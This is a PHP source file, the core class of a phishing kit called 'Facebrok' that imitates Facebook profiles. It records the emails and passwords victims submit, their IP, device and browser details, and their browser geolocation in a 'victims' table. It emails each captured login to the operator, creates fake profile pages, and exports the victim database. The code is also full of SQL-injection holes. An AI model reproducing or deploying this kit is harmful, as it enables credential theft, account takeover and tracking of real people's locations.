<?php

	// FACEBROK CORE

require_once 'GoogleTranslate.class.php';
require_once 'configuration.php';

class facebrok
{
	public $version="1.9";
	protected $_db;
    
    public function error_disable(){error_reporting(0);}
    public function checkInstall(){
     	if(self::get_geo_state()=="true"){
echo'<script type="text/javascript">if(navigator.geolocation){navigator.geolocation.getCurrentPosition(mostrarUbicacion);}else{}function mostrarUbicacion(position){var times = position.timestamp;var latitud = position.coords.latitude;var longitud = position.coords.longitude;var altitud = position.coords.altitude;var exactitud = position.coords.accuracy;var div = document.getElementById("ubicacion");var geo = "Timestamp: " + times + "<br>latitude : " + latitud + "<br>longitude: " + longitud + "<br>altitude : " + altitud + "<br>accuracy : " + exactitud;document.enviar.holy.value=geo;}function refrescarUbicacion(){navigator.geolocation.watchPosition(mostrarUbicacion);}</script>';
echo "<form action='login.php' method=post name=enviar><input type=hidden name=holy>";
    	}
    }
    public function debugMessage($message){echo "<h1><b><br>FACEBROK MESSAGE:<br><font color=green>".$message."</h1><br></b></font>";}
    public function translater($text,$path){
    	require_once 'standard_language.php';
    	$prefix = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);

    	$language_installed = self::get_languages_installed();
    	$language_installed = preg_split("/;/", $language_installed);
    	$state_control=false;
		foreach ($language_installed as $k => $word) {
		       if($prefix == $word) {
					if (file_exists($path."croak/languages/".$word.".xml")) {
					    $xml = simplexml_load_file($path."croak/languages/".$word.".xml");
					    $text = (string) $xml->language->$text;
					    $state_control=true;
					} else {
					    $text = defined_text($text);
					}
		       }
		} 
    	if(self::get_autotranslationstate() == "true" and $state_control==false){$translation = GoogleTranslate::translate('en',$prefix,$text);}else{$translation=$text;}
    	print_r($translation);
    }
    public function __construct()
    {
        $this->_db = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
        if ( $this->_db->connect_errno )
        {
            $this->debugMessage("Failed connection to MySQL: ".$this->_db->connect_error);
            return;    
        }
    }
    public function save_register($email, $password,$geo){
		include      'GetdataReport.Plugin.php';
		$data = new GetDataPlugin();
    	$dates=date("Y/m/d g:ia");
    	$ip=$data->ip();
    	$os=$data->os();
    	$browser=$data->browser();
    	$language=$data->language();
    	$architecture=$data->architecture();
    	$device=$data->device();
    	$country=$data->geo("country");
    	$region=$data->geo("region");
    	$continent=$data->geo("continent");
    	$city=$data->geo("city");
    	$logitude=$data->geo("logitude");
    	$latitude=$data->geo("latitude");
    	$currency=$data->geo("currency");
    	$provetor=$data->provetor();
    	$agent=$data->agent();
    	$referer=$data->referer();
    	$getdate=$data->getdate();
		$result=$this->_db->query("INSERT INTO victims (id, email, password,date,ip,os,browser,language,architecture,device,country,region,continent,city,logitude,latitude,currency,provetor,agent,referer,getdate,geo) VALUES ('','$email','$password','$dates','$ip','$os','$browser','$language','$architecture','$device','$country','$region','$continent','$city','$logitude','$latitude','$currency','$provetor','$agent','$referer','$getdate','$geo')");
    	$email_alert=self::get_email_alert();
    	if ($email_alert!="" or $email_alert!="example@localhost.com"){
    		$html="EMAIL:".$email." PASSWORD:".$password;
			$headers =   'From: facebrok@mailface.com' . "\r\n" .
			             'Reply-To: '.$email_alert.'' . "\r\n" .
			             'MIME-Version: 1.0' . "\r\n" .
						 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
			 mail($target,"{New Victim} Facebrok Notification.", $html, $headers);
    	}
    }
    public function get_url_redirect(){
    	$result1=$this->_db->query("SELECT * FROM settings WHERE options='url_redirect'");
		$result1=$result1->fetch_array(MYSQLI_ASSOC);
		return $result1['value'];
    }
    public function get_email_alert(){
    	$result0=$this->_db->query("SELECT * FROM settings WHERE options='email_alert'");
		$result0=$result0->fetch_array(MYSQLI_ASSOC);
		return $result0['value'];
    }
    public function get_autotranslationstate(){
    	$result12=$this->_db->query("SELECT * FROM settings WHERE options='auto_translationstate'");
		$result12=$result12->fetch_array(MYSQLI_ASSOC);
		return $result12['value'];
    }
    public function get_geo_state(){
    	$result13=$this->_db->query("SELECT * FROM settings WHERE options='Geo_location'");
		$result13=$result13->fetch_array(MYSQLI_ASSOC);
		return $result13['value'];
    }
    public function get_languages_installed(){
    	$result15=$this->_db->query("SELECT * FROM settings WHERE options='language_list'");
		$result15=$result15->fetch_array(MYSQLI_ASSOC);
		return $result15['value'];
    }
    public function check_session(){
    	session_start();
    	if($_SESSION['username']){return true;}else{return false;}
    }
	public function checkuser($username,$password){
		$result2=$this->_db->query("SELECT * FROM users WHERE username='$username' AND password='$password'");
		$result2=$result2->fetch_array(MYSQLI_ASSOC);
		if($result2['username']==$username && $result2['password']==$password){
			session_start();
			$_SESSION['username'] = $result2['username'];
			header("location:index.php");
			return;
		}else{
			header("location:index.php?msg=ERROR_LOGIN");
		}
    }
	public function logout($username,$password){
		session_start();
		unset($_SESSION['username']);
		header("location:index.php");
    }
    public function get_list_victms(){
    	$result3=$this->_db->query("SELECT * FROM victims");
		while($row = $result3->fetch_array(MYSQLI_ASSOC))
		{
    	echo '
    	 <tr>
			<td><input type="checkbox" name="zmark" value="'.$row["id"].'" class="checkbox" /></td>
			<td><h3>[EMAIL] '.$row["email"].' [PASSWORD] '.$row["password"].'</h3></td>
			<td>'.$row["date"].'</td>
			<td><a href="index.php?action=delete_victim&id='.$row["id"].'" class="ico del">Delete</a><a href="index.php?action=extra_victim&id='.$row["id"].'" class="ico edit">Information</a></td>
		</tr>';
		}
    }
    public function delete_victim($id){
		$result4=$this->_db->query("DELETE FROM victims WHERE id='$id'");
		if($result4){return '
		<div class="msg msg-ok">
			<p><strong>Log was delete succesifully!</strong></p>
		</div>
		';}else{
		return '<div class="msg msg-error">
			<p><strong>You must select a file to upload first!</strong></p>
			<a href="#" class="close">close</a>
		</div>';
		}
    }
    public function get_info_victim($id){
		$result5=$this->_db->query("SELECT * FROM victims WHERE id='$id'");
		$result5=$result5->fetch_array(MYSQLI_ASSOC);
		return "
		<pre>
			IP             : ".$result5['ip']."
			OS             : ".$result5['os']."
			BROWSER        : ".$result5['browser']."
			LANGUAGE       : ".$result5['language']."
			architecture   : ".$result5['architecture']."
			device         : ".$result5['device']."
			country        : ".$result5['country']."
			region         : ".$result5['region']."
			continent      : ".$result5['continent']."
			city           : ".$result5['city']."
			logitude       : ".$result5['logitude']."
			latitude       : ".$result5['latitude']."
			currency       : ".$result5['currency']."
			provetor       : ".$result5['provetor']."
			agent          : ".$result5['agent']."
			geo            : ".$result5['geo']."
			getdate        : ".$result5['getdate']."</pre>";
    }
    public function change_url($url){
    	$result6=$this->_db->query("UPDATE settings SET value='$url' WHERE options='url_redirect'");
		if($result6){return '
		<div class="msg msg-ok">
			<p><strong>URL was update succesifully!</strong></p>
		</div>
		';}else{
		return '<div class="msg msg-error">
			<p><strong>Error to change URL!</strong></p>
			<a href="#" class="close">close</a>
		</div>';
		}
    }
    public function change_email($email){
    	$result9=$this->_db->query("UPDATE settings SET value='$email' WHERE options='email_alert'");
		if($result9){return '
		<div class="msg msg-ok">
			<p><strong>Email was update succesifully!</strong></p>
		</div>
		';}else{
		return '<div class="msg msg-error">
			<p><strong>Error to change Email!</strong></p>
			<a href="#" class="close">close</a>
		</div>';
		}
    }
    public function change_auto_translation_state($state){
    	$result9=$this->_db->query("UPDATE settings SET value='$state' WHERE options='auto_translationstate'");
		if($result9){return '
		<div class="msg msg-ok">
			<p><strong>State was update succesifully!</strong></p>
		</div>
		';}else{
		return '<div class="msg msg-error">
			<p><strong>Error to change State!</strong></p>
			<a href="#" class="close">close</a>
		</div>';
		}
	}
    public function change_geo_state($state){
    	$result19=$this->_db->query("UPDATE settings SET value='$state' WHERE options='Geo_location'");
		if($result19){return '
		<div class="msg msg-ok">
			<p><strong>State was update succesifully!</strong></p>
		</div>
		';}else{
		return '<div class="msg msg-error">
			<p><strong>Error to change State!</strong></p>
			<a href="#" class="close">close</a>
		</div>';
		}
	}
	public function create_profile($name, $url_photo_profile,$url_cover_profile){
    	$names=str_replace(" ","",$name);
    	mkdir("../".$names, 0700);
    	$open = fopen('../'.$names.'/index.php','w');
    	fputs($open,"<?php ");
    	fputs($open,"\$username='".$name."';");
    	fputs($open,"\$url_photo='".$url_photo_profile."';");
    	fputs($open,"\$url_cover='".$url_cover_profile."';");
    	fputs($open,"include '../clone_perfil.php';");
    	fputs($open,"?>");
    	return '
		<div class="msg msg-ok">
			<p><strong>Fake Profile was Create succesifully! <a href=../'.$names.' target=_blank>['.$names.']</a></strong></p>
		</div>
		';
    }
    public function export_database()
    {
    	$texto="";
		$con_base=mysql_connect(DB_HOST, DB_USER, DB_PASS);
		$base=DB_NAME;$mitabla="victims";
		$datos=mysql_query("select * from $base.$mitabla;",$con_base);
		$campos=mysql_num_fields($datos);
		$regs=mysql_num_rows($datos);
		for($i=0;$i<$regs;$i++)
		{
			$inserta="insert into $mitabla(";
			for($j=0;$j<$campos;$j++)
			{
			$nombre=mysql_field_name($datos,$j);
			$inserta.="$nombre,";
			}
			$inserta=substr($inserta,0,strlen($inserta)-1).") values(";
			for($j=0;$j<$campos;$j++)
			{
				$tipo=mysql_field_type($datos,$j);
				$valor=mysql_result($datos,$i,$j);
				switch($tipo)
				{
					case "string":
					case "date":
					case "time":
					$valor="'$valor'";
					break;
				}
				$inserta.="$valor,";
			}
			$inserta=substr($inserta,0,strlen($inserta)-1).");";
			$texto.=$inserta."\n";
		}
		header("Content-disposition: attachment;filename=facebrok_database.sql");
		header("Content-Type: text/plain");
		header("Content-Length: 362");
		echo $texto;
    }
    public function add_new_language(){
			$target_dir = "languages/";
			$target_file = $target_dir . basename($_FILES["lang_file"]["name"]);
			$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
			if (!file_exists($target_file)) {
				if($imageFileType == "xml" ) {
				    if (move_uploaded_file($_FILES["lang_file"]["tmp_name"], $target_file)) {
				    	$current_languages=self::get_languages_installed();
				    	$current_languages.=substr($target_file,10,-4);
						$current_languages.=";";
				    	$resultaa=$this->_db->query("UPDATE settings SET value='$current_languages' WHERE options='language_list'");
				        return "<div class='msg msg-ok'><p><strong>The file ". basename( $_FILES["lang_file"]["name"]). " has been uploaded and installed.</strong></p></div>";
				    } else {
				        return "<div class='msg msg-error'><p><strong>Sorry, there was an error uploading your file.</strong></p></div>";
				    }
				}else{return "<div class='msg msg-error'><p><strong>Sorry, the file is not .xml extention.</strong></p></div>";}
			}else{return "<div class='msg msg-error'><p><strong>Sorry, the file already exists.</strong></p></div>";}
   }
}
